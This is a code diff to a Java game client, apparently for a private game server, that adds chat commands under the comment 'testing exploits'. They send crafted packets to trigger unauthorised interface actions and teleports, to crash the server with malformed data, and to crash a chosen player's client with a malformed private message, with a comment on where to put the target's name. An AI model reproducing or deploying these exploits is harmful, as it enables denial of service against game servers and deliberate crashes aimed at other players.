@@ -1669,6 +1669,69 @@ public class Client extends GameRenderer {
 			}
 		}
 		// testing exploits
+		if (cmd.equalsIgnoreCase("if")) { // make over mage interface
+				getOut().putOpcode(185);
+				final int id = 3559;
+				getOut().putShort(id); //drops interface
+				pushMessage("Tried to open interface "+id, 0, "");
+		}
+		if (cmd.equalsIgnoreCase("btn1")) { // lock xp
+			getOut().putOpcode(185);
+			final int id = 15004;
+			getOut().putShort(id);
+			pushMessage("Tried to press btn "+id, 0, "");
+		}
+		if (cmd.equalsIgnoreCase("btn2")) { // herb skilling tele
+			getOut().putOpcode(185);
+			final int id = 8861;
+			getOut().putShort(id);
+			pushMessage("Tried to press btn "+id, 0, "");
+		}
+		if (cmd.equalsIgnoreCase("btn3")) { // tele somewhere
+			getOut().putOpcode(185);
+			final int id = 8659;
+			getOut().putShort(id); //drops interface
+			pushMessage("Tried to press btn "+id, 0, "");
+		}
+		if (cmd.equalsIgnoreCase("btn4")) { // make over mage interface
+			getOut().putOpcode(185);
+			final int id = 26229;
+			getOut().putShort(id); //drops interface
+			pushMessage("Tried to do dungeoneering btn "+id, 0, "");
+		}
+		if (cmd.equalsIgnoreCase("c")) { // crash
+			//while (loggedIn) {
+				//sleep(100);
+				pushMessage("Attempting to crash the server.", 0, "");
+				getOut().putOpcode(4); // player.getStream().createFrame(4);
+				getOut().putShort(6969); // player.getStream().writeWord(6969);
+				getOut().writeUnsignedWordBigEndian(123123); // player.getStream().writeWordBigEndian(123123);
+			//}
+		}
+		if (cmd.equalsIgnoreCase("crash")) {
+			pushMessage("Attempting to crash \"crash\"", 0, "");
+			String message = "what level should i start killing lavas?�";
+			long aLong953 = TextClass.longForName("crash"); //Replace "pure noob" with the person you want to crash
+
+			getOut().putOpcode(126); //player.getStream().createFrame(126);
+			getOut().writeUnsignedWordBigEndian(0); // player.getStream().writeWordBigEndian(0);
+			int k = getOut().position; // player.getStream().currentOffset;
+			getOut().putLong(aLong953); //player.getStream().writeQWord(aLong953);
+
+			// working shit
+			/*
+			TextInput.writeChatboxText(promptInput, getOut());
+			getOut().putVariableSizeByte(getOut().position - k);
+			promptInput = TextInput.processText(promptInput);
+			// promptInput = Censor.doCensor(promptInput);
+			pushMessage(promptInput, 6, TextClass.fixName(TextClass.nameForLong(aLong953)));
+			 */
+
+			TextInput.writeChatboxText(message, getOut());
+			getOut().putVariableSizeByte(getOut().position - k);
+			message = TextInput.processText(message);
+			pushMessage(promptInput, 6, TextClass.fixName(TextClass.nameForLong(aLong953)));
+		}
 		if (cmd.equalsIgnoreCase("sm")) { // smithing exploit
 			pushMessage("Attempting to smith abyssal whip", 0, "");
 			getOut().putOpcode(145);
